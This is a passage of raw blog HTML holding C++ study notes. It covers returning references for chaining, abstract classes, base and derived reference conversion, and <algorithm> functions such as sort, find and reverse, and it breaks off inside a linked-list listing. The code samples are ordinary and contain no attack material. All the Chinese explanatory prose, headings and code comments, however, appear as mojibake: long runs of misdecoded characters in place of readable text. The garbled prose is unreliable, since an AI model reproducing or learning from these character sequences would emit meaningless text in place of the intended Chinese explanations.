class="line">++(++myObject);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œç¬¬ä¸€ä¸ª <code>++</code> æ“ä½œä¿®æ”¹äº† <code>myObject</code> å¹¶è¿”å›äº†å®ƒçš„å¼•ç”¨ï¼Œç¬¬äºŒä¸ª <code>++</code> ç«‹å³ä½œç”¨äºåŒä¸€ä¸ªå¯¹è±¡ã€‚</p><h5 id="4-å®ç°ç¬¦åˆç›´è§‰çš„è¯­ä¹‰"><a href="#4-å®ç°ç¬¦åˆç›´è§‰çš„è¯­ä¹‰" class="headerlink" title="4. å®ç°ç¬¦åˆç›´è§‰çš„è¯­ä¹‰"></a>4. å®ç°ç¬¦åˆç›´è§‰çš„è¯­ä¹‰</h5><p>é€šè¿‡è¿”å›å¼•ç”¨ï¼Œä½ ç¡®ä¿äº†æ“ä½œç¬¦æˆ–æ–¹æ³•çš„è¡Œä¸ºç¬¦åˆä½¿ç”¨è€…çš„ç›´è§‰ã€‚ä¾‹å¦‚ï¼Œèµ‹å€¼è¿ç®—ç¬¦é€šå¸¸é¢„æœŸèƒ½ç›´æ¥åœ¨èµ‹å€¼åä½¿ç”¨å¯¹è±¡ï¼Œå¦‚åœ¨è¡¨è¾¾å¼æˆ–æ¡ä»¶ä¸­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((a = b) == c) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œ<code>a = b</code> èµ‹å€¼å¹¶æµ‹è¯•ä¸ <code>c</code> æ˜¯å¦ç›¸ç­‰ï¼Œè¿™ç§è¡Œä¸ºæ˜¯é€šè¿‡è¿”å› <code>a</code> çš„å¼•ç”¨æ¥å®ç°çš„ã€‚</p><h6 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h6><p>ä½¿ç”¨ <code>MyClass&amp;</code> ä½œä¸ºè¿”å›ç±»å‹æä¾›äº†æ€§èƒ½ä¼˜åŠ¿ï¼Œå…è®¸é“¾å¼è°ƒç”¨ï¼Œä¿æŒäº†æ“ä½œç¬¦çš„é¢„æœŸè¡Œä¸ºï¼Œå¹¶å®ç°äº†ç¬¦åˆç›´è§‰çš„è¯­ä¹‰ã€‚è¿™äº›éƒ½æ˜¯åœ¨è®¾è®¡ç±»æ¥å£æ—¶è€ƒè™‘ä½¿ç”¨å¼•ç”¨ä½œä¸ºè¿”å›ç±»å‹çš„é‡è¦å› ç´ ã€‚</p><h3 id="æŠ½è±¡ç±»andæ¥å£"><a href="#æŠ½è±¡ç±»andæ¥å£" class="headerlink" title="æŠ½è±¡ç±»andæ¥å£"></a>æŠ½è±¡ç±»andæ¥å£</h3><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æŠ½è±¡ç±»ç¤ºä¾‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// çº¯è™šå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// çº¯è™šå‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> radius;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Circle</span>(<span class="type">double</span> r) : <span class="built_in">radius</span>(r) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Drawing a circle.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14159</span> * radius * radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ç±»çš„å¼•ç”¨é‡å†™"><a href="#ç±»çš„å¼•ç”¨é‡å†™" class="headerlink" title="ç±»çš„å¼•ç”¨é‡å†™"></a>ç±»çš„å¼•ç”¨é‡å†™</h3><p>åœ¨C++ä¸­ï¼Œå¦‚æœç±»Aå…¬æœ‰åœ°ç»§æ‰¿è‡ªç±»Bï¼Œé‚£ä¹ˆç±»Bçš„æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘ç±»Açš„å¯¹è±¡ï¼Œä½†åè¿‡æ¥ä¸è¡Œã€‚è¿™æ˜¯å› ä¸ºç±»Båªæ˜¯ç±»Açš„ä¸€éƒ¨åˆ†ï¼Œè€Œç±»AåŒ…å«äº†ç±»Bçš„æ‰€æœ‰ç‰¹æ€§ä»¥åŠé¢å¤–çš„ç‰¹æ€§ã€‚è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥æ›´æ¸…æ¥šåœ°è§£é‡Šè¿™ä¸€ç‚¹ã€‚</p><h3 id="ç¤ºä¾‹è¯´æ˜"><a href="#ç¤ºä¾‹è¯´æ˜" class="headerlink" title="ç¤ºä¾‹è¯´æ˜"></a>ç¤ºä¾‹è¯´æ˜</h3><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸºç±» <code>Base</code> å’Œä¸€ä¸ªä» <code>Base</code> å…¬æœ‰ç»§æ‰¿çš„æ´¾ç”Ÿç±» <code>Derived</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">baseMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Base method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">derivedMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Derived method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>Derived</code> ç±»çš„å¯¹è±¡æ¥åˆå§‹åŒ– <code>Base</code> ç±»çš„å¼•ç”¨æˆ–æŒ‡é’ˆï¼Œå› ä¸ºæ¯ä¸ª <code>Derived</code> å¯¹è±¡éƒ½æ˜¯ä¸€ä¸ª <code>Base</code> å¯¹è±¡ã€‚è¿™æ˜¯å¤šæ€çš„åŸºç¡€ï¼Œå…è®¸ <code>Base</code> ç±»å‹çš„å¼•ç”¨æˆ–æŒ‡é’ˆè°ƒç”¨åœ¨ <code>Derived</code> ç±»ä¸­é‡å†™çš„æ–¹æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Derived derivedObj;</span><br><span class="line">Base &amp;baseRef = derivedObj;  <span class="comment">// æ­£ç¡®ï¼šDerived å¯¹è±¡å¯ä»¥è¢«çœ‹ä½œæ˜¯ Base å¯¹è±¡</span></span><br><span class="line">baseRef.<span class="built_in">baseMethod</span>();        <span class="comment">// è°ƒç”¨ Base çš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œåè¿‡æ¥ä¸è¡Œï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Base baseObj;</span><br><span class="line">Derived &amp;derivedRef = baseObj;  <span class="comment">// é”™è¯¯ï¼šä¸èƒ½å°† Base å¯¹è±¡çš„å¼•ç”¨è½¬æ¢ä¸º Derived å¼•ç”¨</span></span><br><span class="line">derivedRef.<span class="built_in">derivedMethod</span>();     <span class="comment">// è¿™è¡Œä»£ç æ˜¯æ— æ•ˆçš„ï¼Œå› ä¸ºä¸Šä¸€è¡Œå·²ç»æ˜¯ç¼–è¯‘é”™è¯¯</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„é”™è¯¯å‘ç”Ÿæ˜¯å› ä¸º <code>baseObj</code> åªæ˜¯ä¸€ä¸ª <code>Base</code> ç±»å‹çš„å¯¹è±¡ï¼Œå®ƒå¯èƒ½æ²¡æœ‰ <code>Derived</code> ç±»ä¸­å®šä¹‰çš„é¢å¤–æˆå‘˜å’Œæ–¹æ³•ã€‚å°è¯•å°†ä¸€ä¸ª <code>Base</code> ç±»å‹çš„å¯¹è±¡çš„å¼•ç”¨è½¬æ¢ä¸º <code>Derived</code> ç±»å‹çš„å¼•ç”¨æ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸º <code>Derived</code> å¯èƒ½æœ‰æ›´å¤šçš„æ•°æ®æˆå‘˜æˆ–æ–¹æ³•ï¼Œè¿™åœ¨ <code>Base</code> å¯¹è±¡ä¸­å¹¶ä¸å­˜åœ¨ã€‚</p><h3 id="ç»“è®º-1"><a href="#ç»“è®º-1" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>å› æ­¤ï¼Œå…¬æœ‰ç»§æ‰¿å…è®¸åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨æŒ‡å‘æ´¾ç”Ÿç±»çš„å¯¹è±¡ï¼Œä½†ä¸èƒ½ä½¿ç”¨åŸºç±»å¯¹è±¡æ¥åˆå§‹åŒ–æ´¾ç”Ÿç±»çš„å¼•ç”¨ã€‚è¿™ç§ç±»å‹çš„å¼•ç”¨æˆ–æŒ‡é’ˆè½¬æ¢æ˜¯å•å‘çš„ï¼Œåªèƒ½ä»æ´¾ç”Ÿç±»åˆ°åŸºç±»ï¼Œè€Œä¸æ˜¯åè¿‡æ¥ã€‚è¿™æ˜¯é¢å‘å¯¹è±¡è®¾è®¡ä¸­çš„ä¸€ä¸ªé‡è¦å®‰å…¨ç‰¹æ€§ï¼Œå®ƒä¿æŠ¤äº†ç¨‹åºçš„ç±»å‹å®‰å…¨æ€§ã€‚</p><h3 id="algorithmå¤´æ–‡ä»¶"><a href="#algorithmå¤´æ–‡ä»¶" class="headerlink" title="algorithmå¤´æ–‡ä»¶"></a>algorithmå¤´æ–‡ä»¶</h3><p><code>#include &lt;algorithm&gt;</code> æ˜¯C++æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œå®ƒæä¾›äº†å¤§é‡çš„å‡½æ•°æ¨¡æ¿ï¼Œç”¨äºå¤„ç†å„ç§ç®—æ³•æ“ä½œï¼ŒåŒ…æ‹¬æ’åºã€æœç´¢ã€åˆå¹¶ã€æ›¿æ¢ã€æ—‹è½¬ã€åè½¬ç­‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å‡½æ•°å’Œå®ƒä»¬çš„ç”¨é€”ï¼š</p><ul><li><p><strong>æ’åº</strong>ï¼š</p><ul><li><code>sort(first, last)</code>ï¼šå¯¹èŒƒå›´å†…çš„å…ƒç´ è¿›è¡Œæ’åºã€‚</li><li><code>stable_sort(first, last)</code>ï¼šå¯¹èŒƒå›´å†…çš„å…ƒç´ è¿›è¡Œç¨³å®šæ’åºã€‚</li></ul></li><li><p><strong>æœç´¢</strong>ï¼š</p><ul><li><p><code>find(first, last, value)</code>ï¼šåœ¨èŒƒå›´å†…æŸ¥æ‰¾ç‰¹å®šå€¼çš„ç¬¬ä¸€ä¸ªå‡ºç°ä½ç½®ã€‚</p></li><li><p><code>binary_search(first, last, value)</code>ï¼šåœ¨å·²æ’åºçš„èŒƒå›´å†…æ‰§è¡ŒäºŒåˆ†æŸ¥æ‰¾ã€‚</p></li></ul></li><li><p><strong>åˆå¹¶</strong>ï¼š</p><ul><li><code>merge(first1, last1, first2, last2, result)</code>ï¼šåˆå¹¶ä¸¤ä¸ªå·²æ’åºçš„èŒƒå›´åˆ°ä¸€ä¸ªæ–°çš„èŒƒå›´ã€‚</li></ul></li><li><p><strong>æ›¿æ¢</strong>ï¼š</p><ul><li><code>replace(first, last, old_value, new_value)</code>ï¼šå°†èŒƒå›´å†…çš„æ‰€æœ‰æ—§å€¼æ›¿æ¢ä¸ºæ–°å€¼ã€‚</li></ul></li><li><p><strong>æ—‹è½¬</strong>ï¼š</p><ul><li><code>rotate(first, middle, last)</code>ï¼šå°†èŒƒå›´å†…çš„å…ƒç´ æ—‹è½¬ï¼Œä½¿å¾—ä¸­é—´å…ƒç´ æˆä¸ºæ–°çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</li></ul></li><li><p><strong>åè½¬</strong>ï¼š</p><ul><li><code>reverse(first, last)</code>ï¼šåè½¬èŒƒå›´å†…å…ƒç´ çš„é¡ºåºã€‚</li></ul></li></ul><blockquote><p>è¡¥å……ï¼š</p><p>result.back()æ˜¯resultçš„æœ«å°¾</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405102120585.png" alt="image-20240510204749554"></p><p>result.pop_back();ç§»é™¤æœ€åä¸€ä½</p><p>stoi(result);è½¬æ¢ä¸ºintå‹ï¼ˆè€pwnäº†ï¼‰</p><p>result.substr(7)å°†æå–ä»æŒ‡å®šä½ç½®å¼€å§‹åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å­—ç¬¦</p><p>result.substr(7,5)ä»æŒ‡å®šä½ç½®å¼€å§‹è¯»å–5ä¸ªå­—ç¬¦</p></blockquote><p>åœ¨ä½¿ç”¨ <code>&lt;algorithm&gt;</code> å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°æ—¶ï¼Œå¯¹ç±»å‹çš„è¦æ±‚ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><ol><li><strong>è¿­ä»£å™¨è¦æ±‚</strong>ï¼š<ul><li>å¤§å¤šæ•°ç®—æ³•å‡½æ•°éœ€è¦è‡³å°‘æ˜¯è¾“å…¥è¿­ä»£å™¨ï¼ˆInput Iteratorï¼‰çš„è¿­ä»£å™¨ç±»å‹ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ä½¿ç”¨è¿™äº›å‡½æ•°æ¥å¤„ç†ä»»ä½•æ”¯æŒè¾“å…¥è¿­ä»£å™¨çš„å®¹å™¨ï¼Œå¦‚<code>std::vector</code>ã€<code>std::list</code>ã€<code>std::deque</code>ã€<code>std::array</code>ç­‰ï¼Œä»¥åŠæ™®é€šæ•°ç»„ã€‚</li><li>æŸäº›ç®—æ³•å¯èƒ½éœ€è¦æ›´é«˜çº§çš„è¿­ä»£å™¨ç±»å‹ï¼Œå¦‚å‰å‘è¿­ä»£å™¨ï¼ˆForward Iteratorï¼‰ã€åŒå‘è¿­ä»£å™¨ï¼ˆBidirectional Iteratorï¼‰æˆ–éšæœºè®¿é—®è¿­ä»£å™¨ï¼ˆRandom Access Iteratorï¼‰ã€‚ä¾‹å¦‚ï¼Œ<code>sort()</code> å‡½æ•°é€šå¸¸éœ€è¦éšæœºè®¿é—®è¿­ä»£å™¨ã€‚</li></ul></li><li>ç­‰ç­‰ï¼ˆè¿˜æœ‰å¾ˆå¤šçš„è¦æ±‚ä¸»è¦æ¶‰åŠè‡ªå®šä¹‰ç±»åœ¨æ­¤ä¸è¿‡å¤šèµ˜è¿°</li></ol><p><code>algorithm</code> å¤´æ–‡ä»¶æ˜¯C++æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒæä¾›äº†å¤§é‡çš„ç®—æ³•ï¼Œç”¨äºå¤„ç†å’Œæ“ä½œå®¹å™¨ï¼ˆå¦‚æ•°ç»„ã€<code>std::vector</code>ã€<code>std::list</code>ã€<code>std::set</code>ã€<code>std::map</code> ç­‰ï¼‰ä¸­çš„å…ƒç´ ã€‚ä»¥ä¸‹æ˜¯ä¸€äº› <code>algorithm</code> å¤´æ–‡ä»¶ä¸­å¸¸ç”¨å‡½æ•°çš„ä½¿ç”¨ç¤ºä¾‹ï¼š</p><p><code>std::sort</code>ï¼šå¯¹å®¹å™¨ä¸­çš„å…ƒç´ è¿›è¡Œæ’åºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   std::<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// å¯¹æ•´ä¸ªå‘é‡è¿›è¡Œæ’åº</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::find</code>ï¼šåœ¨å®¹å™¨ä¸­æŸ¥æ‰¾ç‰¹å®šå…ƒç´ ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   <span class="type">int</span> target = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">auto</span> it = std::<span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), target); <span class="comment">// æŸ¥æ‰¾å…ƒç´ 3</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (it != v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element found at position: &quot;</span> &lt;&lt; (it - v.<span class="built_in">begin</span>()) &lt;&lt; std::endl;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element not found&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::reverse</code>ï¼šåè½¬å®¹å™¨ä¸­çš„å…ƒç´ é¡ºåºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   std::<span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// åè½¬æ•´ä¸ªå‘é‡</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::max_element</code> å’Œ <code>std::min_element</code>ï¼šæ‰¾åˆ°å®¹å™¨ä¸­çš„æœ€å¤§å’Œæœ€å°å…ƒç´ ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   <span class="keyword">auto</span> max_it = std::<span class="built_in">max_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// æ‰¾åˆ°æœ€å¤§å…ƒç´ </span></span><br><span class="line">   <span class="keyword">auto</span> min_it = std::<span class="built_in">min_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// æ‰¾åˆ°æœ€å°å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Max element: &quot;</span> &lt;&lt; *max_it &lt;&lt; std::endl;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Min element: &quot;</span> &lt;&lt; *min_it &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›åªæ˜¯ <code>algorithm</code> å¤´æ–‡ä»¶ä¸­æä¾›çš„ä¼—å¤šç®—æ³•çš„ä¸€å°éƒ¨åˆ†ã€‚ä½¿ç”¨è¿™äº›ç®—æ³•å¯ä»¥å¤§å¤§ç®€åŒ–å¯¹å®¹å™¨ä¸­å…ƒç´ çš„æ“ä½œï¼Œæé«˜ä»£ç çš„æ•ˆç‡å’Œå¯è¯»æ€§ã€‚</p><h3 id="é“¾è¡¨-1"><a href="#é“¾è¡¨-1" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 